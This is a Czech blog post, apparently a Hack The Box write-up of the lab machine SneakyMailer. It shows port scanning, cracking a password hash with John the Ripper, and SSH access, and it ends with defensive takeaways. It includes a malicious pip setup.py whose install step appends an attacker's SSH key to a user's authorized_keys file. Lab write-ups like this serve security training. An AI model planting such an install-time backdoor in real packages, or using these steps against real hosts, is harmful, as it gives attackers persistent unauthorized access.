---
layout: post
author: Tomáš Matějíček
title: "SneakyMailer"
date: 2021-01-17
tags: linux ssh sudo php exploit enumeration
---

## Úvod a kontext

SneakyMailer je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 -Pn $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v -Pn $IP
```
```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.2
|_http-title: Employee - Dashboard
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: IDLE THREAD=ORDEREDSUBJECT ACL2=UNION completed UIDPLUS ENABLE SORT STARTTLS UTF8=ACCEPTA0001 THREAD=REFERENCES CAPABILITY QUOTA OK NAMESPACE IMAP4rev1 ACL CHILDREN
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
[... výstup zkrácen ...]
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Analýza zjištění

### Lámání hesel nebo hashů

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
```bash
/usr/sbin/john SneakyMailer-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
```
=> soufianeelhaoui
```

## Získání přístupu

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```text
pip Package - setup.py
```
```
import setuptools

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("ssh-rsa __CENSORED__== hack@t")
        f.close()

except Exception as e:
    pass

setuptools.setup(
    name="test",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
```

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
ssh low@10.10.10.197
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```
__CENSORED__
```

## Eskalace oprávnění

### Průzkum možností eskalace

Hledám chybné konfigurace a cesty k vyšším oprávněním.
```bash
sudo -l
```
```
=> (root) NOPASSWD: __CENSORED__
```

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.

## Co si odnést do praxe

- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
- Pravidla `sudo` mají být co nejmenší a bez zbytečných možností typu `SETENV`, volného zápisu nebo vyhodnocování neověřeného vstupu.
- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
